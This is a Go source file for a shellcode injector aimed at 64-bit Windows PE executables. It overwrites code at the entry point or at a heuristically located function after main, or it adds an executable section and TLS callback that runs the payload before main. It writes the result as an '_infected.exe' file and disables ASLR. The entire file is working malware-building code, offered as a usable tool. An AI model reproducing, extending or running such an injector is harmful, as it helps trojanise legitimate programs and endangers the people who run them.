package main

import (
	"encoding/binary"
	"fmt"
	"github.com/Binject/debug/pe"
	"io/ioutil"
	"log"
	"os"
	"regexp"
	"strings"
	"unsafe"
)

func main() {
	if len(os.Args) != 4 {
		fmt.Println("Usage: program function/entrypoint/tlsinject <modify_pe_file_path> <shellcode_or_pe_path>")
		return
	}
	mod := os.Args[1]

	modify := os.Args[2]
	textpath := os.Args[3]

	switch mod {
	case "function":
		execute(modify, textpath)
	case "entrypoint":
		off := findEntryOff(modify)
		replaceTextSectionOffset(modify, textpath, uint64(off))
	case "tlsinject":
		patchTls(modify, textpath)
	default:
		fmt.Println("wrong mode")
	}

}

type IMAGE_DOS_HEADER struct {
	E_magic    uint16
	E_cblp     uint16
	E_cp       uint16
	E_crlc     uint16
	E_cparhdr  uint16
	E_minalloc uint16
	E_maxalloc uint16
	E_ss       uint16
	E_sp       uint16
	E_csum     uint16
	E_ip       uint16
	E_cs       uint16
	E_lfarlc   uint16
	E_ovno     uint16
	E_res      [4]uint16
	E_oemid    uint16
	E_oeminfo  uint16
	E_res2     [10]uint16
	E_lfanew   int32
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_NT_HEADERS64 struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER64
}

type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size           uint32
}

type IMAGE_SECTION_HEADER struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type IMAGE_TLS_DIRECTORY64 struct {
	StartAddressOfRawData uint64
	EndAddressOfRawData   uint64
	AddressOfIndex        uint64
	AddressOfCallBacks    uint64
	SizeOfZeroFill        uint32
	Characteristics       uint32
}

const (
	IMAGE_SCN_MEM_EXECUTE = 0x20000000
	IMAGE_SCN_MEM_READ    = 0x40000000
	IMAGE_SCN_MEM_WRITE   = 0x80000000
)

func alignUp(size, align uint32) uint32 {
	return ((size + align - 1) / align) * align
}

func getNtHeaders(buf []byte) *IMAGE_NT_HEADERS64 {
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&buf[0]))
	return (*IMAGE_NT_HEADERS64)(unsafe.Pointer(&buf[dosHeader.E_lfanew]))
}

func getSectionArr(buf []byte) *[1 << 30]IMAGE_SECTION_HEADER {
	ntHeaders := getNtHeaders(buf)
	return (*[1 << 30]IMAGE_SECTION_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(ntHeaders)) + unsafe.Sizeof(*ntHeaders)))
}

func newSection(buf []byte) *IMAGE_SECTION_HEADER {
	ntHeaders := getNtHeaders(buf)
	sectionArr := getSectionArr(buf)
	firstSecHdr := &sectionArr[0]
	finalSecHdr := &sectionArr[ntHeaders.FileHeader.NumberOfSections-1]
	creatSecHdr := &sectionArr[ntHeaders.FileHeader.NumberOfSections]
	creatSecHdr.SizeOfRawData = 0

	copy(creatSecHdr.Name[:], ".tlss")
	creatSecHdr.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE
	creatSecHdr.VirtualAddress = alignUp(
		finalSecHdr.VirtualAddress+finalSecHdr.VirtualSize,
		ntHeaders.OptionalHeader.SectionAlignment,
	)
	ntHeaders.FileHeader.NumberOfSections++

	if uintptr(unsafe.Pointer(creatSecHdr))-uintptr(unsafe.Pointer(&buf[0])) < uintptr(firstSecHdr.PointerToRawData) {
		return creatSecHdr
	}
	return nil
}

func tlsInject(exeData []byte, ptrStubData []byte, pathToWrite string) bool {
	ntHeaders := getNtHeaders(exeData)
	tlsDataDir := &ntHeaders.OptionalHeader.DataDirectory[9] // IMAGE_DIRECTORY_ENTRY_TLS
	sakeUsed := uint32(0)
	sakeSecData := make([]byte, 0x100+len(ptrStubData))

	sectionArr := getSectionArr(exeData)
	lastSection := &sectionArr[ntHeaders.FileHeader.NumberOfSections-1]
	offsetNewDataStart := alignUp(lastSection.PointerToRawData+lastSection.SizeOfRawData, ntHeaders.OptionalHeader.FileAlignment)

	sakeSection := newSection(exeData)
	if sakeSection == nil {
		return false
	}

	if tlsDataDir.VirtualAddress == 0 || tlsDataDir.Size == 0 {
		imgTlsDir := (*IMAGE_TLS_DIRECTORY64)(unsafe.Pointer(&sakeSecData[0]))
		sakeUsed += uint32(unsafe.Sizeof(*imgTlsDir))

		imgTlsDir.AddressOfIndex = ntHeaders.OptionalHeader.ImageBase + uint64(sakeSection.VirtualAddress)
		imgTlsDir.AddressOfCallBacks = ntHeaders.OptionalHeader.ImageBase + uint64(sakeSection.VirtualAddress) + uint64(sakeUsed)

		addrOfCBackSaveAt := (*[2]uint64)(unsafe.Pointer(&sakeSecData[sakeUsed]))
		sakeUsed += 16 // size of two uint64
		addrOfCBackSaveAt[0] = ntHeaders.OptionalHeader.ImageBase + uint64(sakeSection.VirtualAddress) + uint64(sakeUsed)
		addrOfCBackSaveAt[1] = 0

		tlsDataDir.VirtualAddress = sakeSection.VirtualAddress
		tlsDataDir.Size = sakeUsed
	} else {
		imgTlsDirOffset := rvaToOffset(exeData, tlsDataDir.VirtualAddress)
		if imgTlsDirOffset == 0 || int(imgTlsDirOffset)+int(unsafe.Sizeof(IMAGE_TLS_DIRECTORY64{})) > len(exeData) {
			log.Printf("Invalid TLS directory offset: %d", imgTlsDirOffset)
			return false
		}
		imgTlsDir := *(*IMAGE_TLS_DIRECTORY64)(unsafe.Pointer(&exeData[imgTlsDirOffset]))

		k := rvaToOffset(exeData, uint32(imgTlsDir.AddressOfCallBacks-ntHeaders.OptionalHeader.ImageBase))
		if k == 0 || int(k)+16 > len(exeData) {
			log.Printf("Invalid AddressOfCallBacks offset: %d", k)
			return false
		}
		addrOfCBackSaveAt := (*[2]uint64)(unsafe.Pointer(&exeData[k]))
		numOfCBacks := len(addrOfCBackSaveAt)
		addrOfCBackSaveAt[numOfCBacks-1] = ntHeaders.OptionalHeader.ImageBase + uint64(sakeSection.VirtualAddress)
		addrOfCBackSaveAt[numOfCBacks] = 0
	}

	fileSakeSize := alignUp(sakeUsed+uint32(len(ptrStubData)), ntHeaders.OptionalHeader.FileAlignment)
	sectSakeSize := alignUp(sakeUsed+uint32(len(ptrStubData)), ntHeaders.OptionalHeader.SectionAlignment)
	sakeSection.PointerToRawData = offsetNewDataStart
	sakeSection.SizeOfRawData = fileSakeSize
	sakeSection.VirtualSize = sectSakeSize

	outExeBuf := make([]byte, len(exeData)+int(fileSakeSize))
	copy(outExeBuf, exeData)
	copy(outExeBuf[offsetNewDataStart:], sakeSecData[:sakeUsed])
	copy(outExeBuf[offsetNewDataStart+sakeUsed:], ptrStubData)

	fixUp_SaveExeToFile(outExeBuf, pathToWrite)
	return true
}

func rvaToOffset(exeData []byte, RVA uint32) uint32 {
	ntHeaders := getNtHeaders(exeData)
	sectionArr := getSectionArr(exeData)
	for i := uint16(0); i < ntHeaders.FileHeader.NumberOfSections; i++ {
		section := &sectionArr[i]
		if RVA >= section.VirtualAddress && RVA <= section.VirtualAddress+section.VirtualSize {
			return section.PointerToRawData + (RVA - section.VirtualAddress)
		}
	}
	return 0
}

func fixUp_SaveExeToFile(bufToSave []byte, pathToWrite string) {
	ntHeaders := getNtHeaders(bufToSave)
	sectionArr := getSectionArr(bufToSave)

	for i := uint16(1); i < ntHeaders.FileHeader.NumberOfSections; i++ {
		sectionArr[i-1].VirtualSize = sectionArr[i].VirtualAddress - sectionArr[i-1].VirtualAddress
	}

	lastSection := &sectionArr[ntHeaders.FileHeader.NumberOfSections-1]
	lastSection.VirtualSize = alignUp(lastSection.SizeOfRawData, ntHeaders.OptionalHeader.SectionAlignment)

	ntHeaders.OptionalHeader.SizeOfImage = lastSection.VirtualAddress + lastSection.VirtualSize

	ntHeaders.OptionalHeader.DllCharacteristics &^= 0x0040 // IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE

	err := ioutil.WriteFile(pathToWrite, bufToSave, 0644)
	if err != nil {
		log.Fatalf("Failed to write output file: %v", err)
	}
}

func patchTls(peFilePath, shellcodePath string) {
	exeData, err := ioutil.ReadFile(peFilePath)
	if err != nil {
		log.Fatalf("Failed to read PE file: %v", err)
	}

	shellcode, err := ioutil.ReadFile(shellcodePath)
	if err != nil {
		log.Fatalf("Failed to read shellcode file: %v", err)
	}

	outputPath := peFilePath[:len(peFilePath)-4] + "_infected.exe"
	if tlsInject(exeData, shellcode, outputPath) {
		fmt.Printf("TLS injection successful. Output file: %s\n", outputPath)
	} else {
		fmt.Println("TLS injection failed.")
	}
}

func findEntryOff(pePath string) uint32 {
	// 打开 PE 文件
	file, err := pe.Open(pePath)
	if err != nil {
		fmt.Println("Error opening PE file:", err)
		return 0
	}
	defer file.Close()

	// 获取 AddressOfEntryPoint
	entryPoint := file.OptionalHeader.(*pe.OptionalHeader64).AddressOfEntryPoint

	fmt.Printf("AddressOfEntryPoint: 0x%X\n", entryPoint)

	// 计算文件偏移
	return rva2offset(file, entryPoint)
}

func rva2offset(pefile *pe.File, rva uint32) uint32 {
	for _, section := range pefile.Sections {
		if rva >= section.VirtualAddress && rva < section.VirtualAddress+section.VirtualSize {
			return rva - section.VirtualAddress + section.Offset
		}
	}
	return 0
}

func va2rva(pefile *pe.File, va uint64) uint32 {
	imageBase := pefile.OptionalHeader.(*pe.OptionalHeader64).ImageBase
	return uint32(va - imageBase)
}
func replaceTextSectionOffset(peFilePath, textBinPath string, off uint64) {
	peFile, err := pe.Open(peFilePath)
	if err != nil {
		fmt.Println("无法读取PE文件:", err)
		return
	}
	defer peFile.Close()

	fileOffset := off
	if fileOffset == 0 {
		fmt.Println("错误: 无法找到对应的文件偏移，RVA 可能不在任何节区中。")
		return
	}

	textData, err := ioutil.ReadFile(textBinPath)
	if err != nil {
		fmt.Println("无法读取text bin文件:", err)
		return
	}

	file, err := os.OpenFile(peFilePath, os.O_RDWR, 0644)
	if err != nil {
		fmt.Println("无法打开PE文件:", err)
		return
	}
	defer file.Close()

	if _, err := file.Seek(int64(fileOffset), 0); err != nil {
		fmt.Println("无法定位到文件偏移:", err)
		return
	}

	if _, err := file.Write(textData); err != nil {
		fmt.Println("无法写入数据:", err)
		return
	}

	fmt.Println("成功: .text节区已成功覆盖在PE文件中。")
}

func replaceTextSection(peFilePath, textBinPath string, va uint64) {
	peFile, err := pe.Open(peFilePath)
	if err != nil {
		fmt.Println("无法读取PE文件:", err)
		return
	}
	defer peFile.Close()

	rva := va2rva(peFile, va)
	fileOffset := rva2offset(peFile, rva)
	if fileOffset == 0 {
		fmt.Println("错误: 无法找到对应的文件偏移，RVA 可能不在任何节区中。")
		return
	}

	textData, err := ioutil.ReadFile(textBinPath)
	if err != nil {
		fmt.Println("无法读取text bin文件:", err)
		return
	}

	file, err := os.OpenFile(peFilePath, os.O_RDWR, 0644)
	if err != nil {
		fmt.Println("无法打开PE文件:", err)
		return
	}
	defer file.Close()

	if _, err := file.Seek(int64(fileOffset), 0); err != nil {
		fmt.Println("无法定位到文件偏移:", err)
		return
	}

	if _, err := file.Write(textData); err != nil {
		fmt.Println("无法写入数据:", err)
		return
	}

	fmt.Println("成功: .text节区已成功覆盖在PE文件中。")
}

func extractTextSection(pePath, outputPath string) {
	peFile, err := pe.Open(pePath)
	if err != nil {
		fmt.Println("错误: PE文件加载失败。", err)
		return
	}
	defer peFile.Close()

	for _, section := range peFile.Sections {
		if strings.Contains(string(section.Name), ".text") {
			data, err := section.Data()
			if err != nil {
				fmt.Println("错误: 无法获取.text节区的数据。", err)
				return
			}

			err = ioutil.WriteFile(outputPath, data, 0644)
			if err != nil {
				fmt.Println("错误: 无法写入输出文件。", err)
				return
			}

			fmt.Println("成功: .text节区已提取并保存。")
			return
		}
	}

	fmt.Println("错误: 没有找到.text节区")
}

func checkFileExist(filePath string) bool {
	info, err := os.Stat(filePath)
	if os.IsNotExist(err) {
		return false
	}
	return !info.IsDir()
}

func execute(modifyPEFilePath, textOrPEPath string) {
	if modifyPEFilePath == "" || textOrPEPath == "" {
		fmt.Println("错误: 输入不能为空。")
		return
	}

	if !strings.HasSuffix(strings.ToLower(modifyPEFilePath), ".exe") {
		fmt.Println("错误: 待修改的PE文件必须是.exe格式。")
		return
	}

	fmt.Println("启动自动化patch")
	va := findCrtFunction(modifyPEFilePath)

	fmt.Printf("成功: 获取到可能patch func va: %x\n", va)

	var textBinPath string
	if strings.HasSuffix(strings.ToLower(textOrPEPath), ".exe") {
		if !checkFileExist(textOrPEPath) {
			fmt.Println("错误: PE文件不可读或不存在。")
			return
		}
		textBinPath = textOrPEPath + ".text"
		extractTextSection(textOrPEPath, textBinPath)
	} else {
		if !checkFileExist(textOrPEPath) {
			fmt.Println("错误: .text文件不可读或不存在。")
			return
		}
		textBinPath = textOrPEPath
	}

	replaceTextSection(modifyPEFilePath, textBinPath, va)
}

func findCrtFunction(pePath string) uint64 {
	peFile, err := pe.Open(pePath)
	if err != nil {
		fmt.Println("无法读取PE文件:", err)
		return 0
	}
	defer peFile.Close()

	entryPointRva := peFile.OptionalHeader.(*pe.OptionalHeader64).AddressOfEntryPoint
	codeSize := uint32(0x100)
	codeRva := entryPointRva - 0x10
	codeVa := uint64(codeRva) + peFile.OptionalHeader.(*pe.OptionalHeader64).ImageBase
	code, err := getMemoryMappedImage(peFile)
	if err != nil {
		fmt.Println("无法获取内存映射镜像:", err)
		return 0
	}

	code = code[codeRva : codeRva+codeSize]

	callJmpCount := 0
	var crtAddr uint64
	for i := 0; i < len(code)-5; i++ {
		if code[i] == 0xE9 { // jmp opcode
			callJmpCount++
			if callJmpCount == 1 {
				relativeAddr := int32(binary.LittleEndian.Uint32(code[i+1 : i+5]))
				crtAddr = uint64(int64(codeVa) + int64(i) + int64(relativeAddr) + 5)
				fmt.Printf("CRT function VA: 0x%x\n", crtAddr)
				break
			}
		}
	}
	return findByCrt(pePath, crtAddr)
}

func findByCrt(pePath string, crtAddr uint64) uint64 {
	peFile, err := pe.Open(pePath)
	if err != nil {
		fmt.Println("无法读取PE文件:", err)
		return 0
	}
	defer peFile.Close()

	crtAddrRva := va2rva(peFile, crtAddr)
	codeSize := uint32(0x300)
	codeRva := crtAddrRva
	codeVa := uint64(codeRva) + peFile.OptionalHeader.(*pe.OptionalHeader64).ImageBase
	code, err := getMemoryMappedImage(peFile)
	if err != nil {
		fmt.Println("无法获取内存映射镜像:", err)
		return 0
	}

	code = code[codeRva : codeRva+codeSize]

	var crtR8Addr uint64
	crtR8AddrCount := 0
	for i := 0; i < len(code)-3; i++ {
		if code[i] == 0x4C && code[i+1] == 0x8B && code[i+2]>>4 == 0xC { // mov r8, ...
			crtR8AddrCount++
			if crtR8AddrCount == 1 {
				crtR8Addr = codeVa + uint64(i)
				fmt.Printf("CRT's mov r8 instruction VA: 0x%x\n", crtR8Addr)
				break
			}
		}
	}
	return findByR8(pePath, crtR8Addr)
}

func isHex(s string) bool {
	matched, _ := regexp.MatchString(`^0x[0-9a-fA-F]+$`, s)
	return matched
}

func findByR8(pePath string, crtR8Addr uint64) uint64 {
	peFile, err := pe.Open(pePath)
	if err != nil {
		fmt.Println("无法读取PE文件:", err)
		return 0
	}
	defer peFile.Close()

	crtR8AddrRva := va2rva(peFile, crtR8Addr)
	codeSize := uint32(0x50)
	codeRva := crtR8AddrRva
	codeVa := uint64(codeRva) + peFile.OptionalHeader.(*pe.OptionalHeader64).ImageBase
	code, err := getMemoryMappedImage(peFile)
	if err != nil {
		fmt.Println("无法获取内存映射镜像:", err)
		return 0
	}

	code = code[codeRva : codeRva+codeSize]

	mainAddrCount := 0
	var mainAddr uint64
	for i := 0; i < len(code)-5; i++ {
		if code[i] == 0xE8 { // call opcode
			relativeAddr := int32(binary.LittleEndian.Uint32(code[i+1 : i+5]))
			opStr := fmt.Sprintf("0x%x", uint64(int64(codeVa)+int64(i)+int64(relativeAddr)+5))
			if isHex(opStr) {
				mainAddrCount++
				if mainAddrCount == 1 {
					mainAddr = uint64(int64(codeVa) + int64(i) + int64(relativeAddr) + 5)
					fmt.Printf("main instruction VA: 0x%x\n", mainAddr)
					break
				}
			}
		}
	}
	return findByMain(pePath, mainAddr)
}

func findByMain(pePath string, mainAddr uint64) uint64 {
	peFile, err := pe.Open(pePath)
	if err != nil {
		fmt.Println("无法读取PE文件:", err)
		return 0
	}
	defer peFile.Close()

	mainAddrRva := va2rva(peFile, mainAddr)
	codeSize := uint32(0x200)
	codeRva := mainAddrRva
	codeVa := uint64(codeRva) + peFile.OptionalHeader.(*pe.OptionalHeader64).ImageBase
	code, err := getMemoryMappedImage(peFile)
	if err != nil {
		fmt.Println("无法获取内存映射镜像:", err)
		return 0
	}

	code = code[codeRva : codeRva+codeSize]

	for i := 0; i < len(code)-5; i++ {
		if code[i] == 0xE8 || code[i] == 0xE9 { // call or jmp opcode
			relativeAddr := int32(binary.LittleEndian.Uint32(code[i+1 : i+5]))
			patchAddr := uint64(int64(codeVa) + int64(i) + int64(relativeAddr) + 5)
			opStr := fmt.Sprintf("0x%x", patchAddr)
			if isHex(opStr) {
				fmt.Printf("may patch: 0x%x\n", patchAddr)
				if filterByFuncRet(pePath, patchAddr) {
					fmt.Printf("patch func instruction VA: 0x%x\n", patchAddr)
					return patchAddr
				}
			}
		}
	}
	return 0
}

func filterByFuncRet(pePath string, patchAddr uint64) bool {
	peFile, err := pe.Open(pePath)
	if err != nil {
		fmt.Println("无法读取PE文件:", err)
		return false
	}
	defer peFile.Close()

	patchAddrRva := va2rva(peFile, patchAddr)
	codeSize := uint32(0x4000)
	codeRva := patchAddrRva
	codeVa := uint64(codeRva) + peFile.OptionalHeader.(*pe.OptionalHeader64).ImageBase
	code, err := getMemoryMappedImage(peFile)
	if err != nil {
		fmt.Println("无法获取内存映射镜像:", err)
		return false
	}

	code = code[codeRva : codeRva+codeSize]

	var patchRetnAddr uint64
	patchAddrCount := 0
	for i := 0; i < len(code)-1; i++ {
		if code[i] == 0xC3 { // ret opcode
			patchAddrCount++
			if patchAddrCount == 1 {
				patchRetnAddr = codeVa + uint64(i)
				fmt.Printf("patch func retn VA: 0x%x\n", patchRetnAddr)
				break
			}
		}
	}
	fmt.Printf("Function size: 0x%x\n", patchRetnAddr-patchAddr)
	return patchRetnAddr-patchAddr > 0x60
}

func getMemoryMappedImage(peFile *pe.File) ([]byte, error) {
	imageSize := peFile.OptionalHeader.(*pe.OptionalHeader64).SizeOfImage
	image := make([]byte, imageSize)

	for _, section := range peFile.Sections {
		data, err := section.Data()
		if err != nil {
			return nil, fmt.Errorf("无法获取节区数据: %v", err)
		}
		start := int(section.VirtualAddress)
		end := start + len(data)
		copy(image[start:end], data)
	}
	return image, nil
}
